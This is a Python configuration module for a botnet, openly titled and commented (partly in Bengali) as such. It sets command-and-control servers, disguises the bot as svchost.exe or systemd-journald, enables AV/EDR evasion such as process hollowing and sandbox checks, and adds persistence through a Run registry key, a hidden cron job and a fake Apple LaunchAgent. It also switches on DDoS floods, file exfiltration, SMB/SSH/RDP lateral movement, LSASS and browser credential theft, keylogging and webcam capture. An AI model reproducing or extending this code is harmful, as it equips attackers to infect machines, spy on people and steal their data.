# -*- coding: utf-8 -*-

"""
Advanced Botnet Configuration Module (config.py)
Version: 3.0.0-Enterprise
Description: Centralized configuration for the Botnet infrastructure.
             Supports multi-platform execution, advanced C2 evasion,
             encrypted payloads, and modular plugin architecture.
"""
import os
import sys
import platform
import socket
import random
import string
import json
import base64
import hashlib
from datetime import datetime, timedelta
from typing import Dict, List, Any, Optional
from dataclasses import dataclass, field

# Third-party dependencies for advanced features
try:
    from Crypto.Cipher import AES, ChaCha20
    from Crypto.Random import get_random_bytes
    from Crypto.Util.Padding import pad, unpad
    from Crypto.Hash import SHA256
except ImportError:
    raise ImportError("PyCryptodome is required. Install via: pip install pycryptodome")

try:
    import requests
    import psutil
except ImportError:
    pass  # Optional dependencies for enhanced features

# ==============================================================================
# 🌐 NETWORK & C2 COMMUNICATION PROTOCOLS
# ==============================================================================

class C2Protocol:
    """Defines the communication protocol between Bot and C2."""
    TCP = "tcp"
    HTTP = "http"
    HTTPS = "https"
    DNS = "dns"
    ICMP = "icmp"

class EncryptionAlgorithm:
    AES_GCM = "AES-GCM-256"
    CHACHA20_POLY1305 = "ChaCha20-Poly1305"
    RSA_OAEP = "RSA-OAEP"

# ==============================================================================
# 🔐 ENCRYPTION & CRYPTOGRAPHY SETTINGS
# ==============================================================================

@dataclass
class CryptoConfig:
    """Configuration for encryption keys and algorithms."""

    MASTER_KEY_BITS: int = 256
    IV_SIZE: int = 12

    PRIMARY_CIPHER: str = EncryptionAlgorithm.AES_GCM
    KEY_ROTATION_JITTER_MIN: int = 300
    KEY_ROTATION_JITTER_MAX: int = 900

# ==============================================================================
# 📡 C2 SERVER DETAILS & FAILOVER
# ==============================================================================

@dataclass
class C2Server:
    """Represents a Command and Control server endpoint."""
    host: str
    port: int
    protocol: str = C2Protocol.HTTPS
    path: str = "/api/v1/update"
    headers: Dict[str, str] = field(default_factory=lambda: {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Content-Type": "application/json"
    })
    connect_timeout: int = 5
    read_timeout: int = 10
    verify_tls: bool = False

# ==============================================================================
# 🧬 BOT IDENTITY & PERSISTENCE
# ==============================================================================

@dataclass
class BotIdentity:
    """Unique identifier and metadata for the bot instance."""

    bot_id: str = field(default_factory=lambda: hashlib.sha256(
        os.urandom(16) + str(datetime.now()).encode()
    ).hexdigest()[:16])

    process_name: str = "svchost.exe" if platform.system() == "Windows" else "systemd-journald"

    @property
    def is_windows(self) -> bool:
        return platform.system() == "Windows"

    @property
    def is_linux(self) -> bool:
        return platform.system() == "Linux"

    @property
    def is_macos(self) -> bool:
        return platform.system() == "Darwin"

# ==============================================================================
# 🛡️ ANTI-DETECTION & STEALTH SETTINGS
# ==============================================================================

@dataclass
class StealthConfig:
    """Settings for avoiding detection by AV/EDR."""

    INJECT_METHOD: str = "process_hollowing"
    MAX_CPU_PERCENT: int = 15
    SLEEP_JITTER_MIN_SEC: int = 60
    SLEEP_JITTER_MAX_SEC: int = 300
    CHECK_VMWARE: bool = True
    CHECK_VBOX: bool = True
    CHECK_TIME_DRIFT: bool = True
    FILELESS_MODE: bool = True
    OBFUSCATION_LEVEL: int = 3

    @property
    def is_windows(self) -> bool:
        return platform.system() == "Windows"

    @property
    def is_linux(self) -> bool:
        return platform.system() == "Linux"

    @property
    def is_macos(self) -> bool:
        return platform.system() == "Darwin"

# ==============================================================================
# 📂 PERSISTENCE MECHANISMS
# ==============================================================================

@dataclass
class PersistenceConfig:
    """Methods to ensure the bot survives reboots."""

    WIN_REG_KEY: str = r"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run"
    WIN_REG_VALUE: str = "SystemUpdateHelper"
    LINUX_CRON_JOB: str = "*/5 * * * * /usr/bin/python3 ~/.cache/.hidden_bot.py > /dev/null 2>&1"
    MACOS_PLIST_PATH: str = "~/Library/LaunchAgents/com.apple.update.helper.plist"
    ENABLED: bool = True

    @property
    def ACTIVE_METHODS(self) -> List[str]:
        """Returns active persistence methods based on OS."""
        if platform.system() == "Windows":
            return ["registry", "startup_folder"]
        elif platform.system() == "Linux":
            return ["cron", "systemd"]
        elif platform.system() == "Darwin":
            return ["launchd"]
        return []

# ==============================================================================
# 📦 MODULE CONFIGURATION
# ==============================================================================

@dataclass
class ModuleConfig:
    """Configuration for individual botnet modules."""

    ddos: Dict[str, Any] = field(default_factory=lambda: {
        "enabled": True,
        "attack_types": ["http_flood", "slowloris", "udp_flood"],
        "target_ip": None,
        "duration_seconds": 300,
        "threads": 50,
        "payload_size": 1024,
    })

    exfil: Dict[str, Any] = field(default_factory=lambda: {
        "enabled": True,
        "methods": ["zip_and_encrypt", "direct_stream"],
        "file_extensions_to_steal": [".docx", ".pdf", ".xlsx", ".jpg", ".png", ".key"],
        "max_file_size_mb": 50,
        "upload_interval_minutes": 60,
    })

    lateral: Dict[str, Any] = field(default_factory=lambda: {
        "enabled": True,
        "protocols": ["smb", "ssh", "rdp"],
        "username": None,
        "password": None,
        "max_hops": 3,
    })

    tor: Dict[str, Any] = field(default_factory=lambda: {
        "enabled": True,
        "port": 9050,
        "data_dir": "~/.tor/data",
        "bandwidth_limit_mb": 100,
    })

    creds: Dict[str, Any] = field(default_factory=lambda: {
        "enabled": True,
        "targets": ["lsass", "chrome", "firefox"],
        "output_format": "json",
    })

# ==============================================================================
# 📊 LOGGING & TELEMETRY
# ==============================================================================

@dataclass
class LoggingConfig:
    """Settings for internal bot logging and telemetry."""

    log_dir: str = os.path.expanduser("~/.dig_bot/logs/")
    log_file: str = field(default_factory=lambda: f"bot_{BotIdentity().bot_id}.log")
    level: str = "INFO"
    max_size_mb: int = 10
    backup_count: int = 5
    send_telemetry: bool = True
    telemetry_interval_seconds: int = 3600

# ==============================================================================
# 🌍 GLOBAL CONFIGURATION OBJECT
# ==============================================================================

class BotConfig:
    """
    Singleton-like configuration manager for the botnet.
    Provides access to all settings in a structured manner.
    """

    def __init__(self):
        self.crypto = CryptoConfig()
        self.identity = BotIdentity()
        self.stealth = StealthConfig()
        self.persistence = PersistenceConfig()
        self.modules = ModuleConfig()
        self.logging = LoggingConfig()

        # C2 Servers
        self.c2_primary = C2Server(
            host="127.0.0.1",
            port=4444,
            protocol=C2Protocol.TCP
        )
        self.c2_backup_1 = C2Server(
            host="10.0.0.50",
            port=8080,
            protocol=C2Protocol.HTTP
        )
        self.c2_backup_2 = C2Server(
            host="dns.tor.hidden.service",
            port=9050,
            protocol=C2Protocol.TCP
        )

    def get_all_settings(self) -> Dict[str, Any]:
        """Returns a dictionary of all configuration settings for serialization."""
        return {
            "crypto": {
                "algorithm": self.crypto.PRIMARY_CIPHER,
                "iv_size": self.crypto.IV_SIZE
            },
            "c2": {
                "primary": {
                    "host": self.c2_primary.host,
                    "port": self.c2_primary.port,
                    "protocol": self.c2_primary.protocol,
                    "path": self.c2_primary.path
                },
                "backups": [
                    {"host": c.host, "port": c.port, "protocol": c.protocol}
                    for c in [self.c2_backup_1, self.c2_backup_2]
                ]
            },
            "identity": {
                "bot_id": self.identity.bot_id,
                "process_name": self.identity.process_name
            },
            "stealth": {
                "inject_method": self.stealth.INJECT_METHOD,
                "max_cpu": self.stealth.MAX_CPU_PERCENT,
                "sleep_jitter": (self.stealth.SLEEP_JITTER_MIN_SEC, self.stealth.SLEEP_JITTER_MAX_SEC),
                "fileless_mode": self.stealth.FILELESS_MODE
            },
            "persistence": {
                "enabled": self.persistence.ENABLED,
                "methods": self.persistence.ACTIVE_METHODS
            },
            "modules": {
                "ddos": self.modules.ddos,
                "exfil": self.modules.exfil,
                "lateral": self.modules.lateral,
                "tor": self.modules.tor,
                "creds": self.modules.creds
            },
            "logging": {
                "log_dir": self.logging.log_dir,
                "level": self.logging.level
            }
        }

    def serialize(self) -> str:
        """Serializes the configuration to a JSON string."""
        settings = self.get_all_settings()
        return json.dumps(settings, indent=2)

# ==============================================================================
# 🔌 SIMPLE EXPORTS FOR LEGACY CODE (c2_server.py, bot_client.py)
# ==============================================================================

# ✅ C2 Server Connection Details
C2_IP = "127.0.0.1"          # লোকালহোস্ট (একই মেশিনে টেস্টের জন্য)
C2_PORT = 4444               # C2 সার্ভারের পোর্ট
C2_SERVER_IP = C2_IP         # Alias for tor_relay.py
C2_SERVER_PORT = C2_PORT     # Alias for tor_relay.py

# ✅ Encryption Keys (16 bytes each - AES-128 compatible)
KEY = b'my_fixed_key_16!!'   # 16 বাইটের কী
IV = b'my_fixed_iv_16!!!'    # 16 বাইটের IV

# ✅ Bot Identity
BOT_NAME = "system_health_monitor"
ENCRYPTION_MODE = "CFB"      # এনক্রিপশন মোড

# ✅ Module Configuration
STEAL_INTERVAL = 60          # 60 সেকেন্ড পর পর ডেটা চুরি হবে
MAX_THREADS = 50             # DDoS-এর জন্য সর্বোচ্চ থ্রেড সংখ্যা
TOR_MAX_THREADS = 5          # Tor-এর জন্য সর্বোচ্চ থ্রেড
LOG_FILE = "botnet.log"      # লগ ফাইলের নাম
UPDATE_INTERVAL = 3600       # 1 ঘন্টা পর পর আপডেট চেক

# ✅ UPDATE FILE CONFIGURATION - NEW
UPDATE_FILE = "bot_update.py"        # C2 Server এ আপডেট ফাইলের নাম
UPDATE_FILE_FALLBACK = "modules/auto_update.py"  # ব্যাকআপ ফাইল


# ✅ File Collection Settings - NO LIMIT
MAX_FILE_SIZE = 10 * 1024 * 1024  # 10MB (এর বেশি ফাইল বাদ)
MIN_FILE_SIZE = 1024              # 1KB (খুব ছোট ফাইল বাদ)
SCAN_DEPTH = 5                    # ৫ লেভেল গভীর

# ✅ Browser Settings - Dynamic Detection
BROWSER_DETECTION_ENABLED = True
BROWSER_DATA_ENABLED = True

# ✅ Steal Settings
STEAL_ENABLED = True
STEAL_MODULES = {
    'browser': True,
    'keylogger': True,
    'clipboard': True,
    'screenshot': True,
    'webcam': True,
    'system_info': True,
    'dynamic_files': True
}

# ==============================================================================
# 📤 EXPORT ALL
# ==============================================================================

__all__ = [
    # Legacy exports
    'C2_IP',
    'C2_PORT',
    'C2_SERVER_IP',
    'C2_SERVER_PORT',
    'KEY',
    'IV',
    'BOT_NAME',
    'ENCRYPTION_MODE',
    'STEAL_INTERVAL',
    'MAX_THREADS',
    'TOR_MAX_THREADS',
    'LOG_FILE',
    'UPDATE_INTERVAL',
    'UPDATE_FILE',              # ✅ নতুন
    'UPDATE_FILE_FALLBACK',     # ✅ নতুন
    'MAX_FILE_SIZE',
    'MIN_FILE_SIZE',
    'SCAN_DEPTH',
    'BROWSER_DETECTION_ENABLED',
    'BROWSER_DATA_ENABLED',
    'STEAL_ENABLED',
    'STEAL_MODULES',

    # Classes
    'BotConfig',
    'StealthConfig',
    'PersistenceConfig',
    'ModuleConfig',
    'LoggingConfig',
    'CryptoConfig',
    'C2Server',
    'C2Protocol',
    'EncryptionAlgorithm',

    # Global instances
    'CONFIG',
    'get_config'
]

# ==============================================================================
# 🚀 INITIALIZATION
# ==============================================================================

# Initialize the global configuration instance
CONFIG = BotConfig()

def get_config() -> BotConfig:
    """Returns the global bot configuration instance."""
    return CONFIG

def print_config_summary():
    """Prints a summary of the current configuration for debugging."""
    print("=" * 50)
    print("BOTNET CONFIGURATION SUMMARY")
    print("=" * 50)
    print(f"Bot ID: {CONFIG.identity.bot_id}")
    print(f"C2 Primary: {CONFIG.c2_primary.host}:{CONFIG.c2_primary.port} ({CONFIG.c2_primary.protocol})")
    print(f"Encryption: {CONFIG.crypto.PRIMARY_CIPHER}")
    print(f"Stealth Mode: {'Enabled' if CONFIG.stealth.FILELESS_MODE else 'Disabled'}")
    print(f"Persistence: {CONFIG.persistence.ENABLED} via {CONFIG.persistence.ACTIVE_METHODS}")
    print(f"Active Modules: DDoS, Exfil, Lateral, Tor, Creds")
    print(f"Steal Interval: {STEAL_INTERVAL} seconds")
    print(f"Max File Size: {MAX_FILE_SIZE / (1024*1024):.0f} MB")
    print(f"Update File: {UPDATE_FILE}")
    print("=" * 50)

if __name__ == "__main__":
    # For testing purposes
    print_config_summary()
    print("\nSerialized Config:")
    print(CONFIG.serialize())
